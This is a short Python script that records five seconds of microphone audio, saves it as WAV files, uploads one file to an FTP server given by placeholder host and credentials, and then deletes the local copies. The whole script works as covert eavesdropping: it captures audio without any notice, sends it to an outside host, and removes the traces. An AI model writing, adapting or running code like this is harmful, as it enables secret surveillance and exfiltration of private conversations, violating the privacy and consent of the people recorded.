import os
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import ftplib
  
freq = 44100

duration = 5

recording = sd.rec(int(duration * freq), 
                   samplerate=freq, channels=2)
sd.wait()

write("recording0.wav", freq, recording)

wv.write("recording1.wav", recording, freq, sampwidth=2)

session = ftplib.FTP('FTP Server','FTP Username','FTP Password')
file = open('recording1.wav','rb')
session.storbinary('STOR recording1.wav', file)
file.close()
session.quit()

os.remove("recording0.wav")
os.remove("recording1.wav")
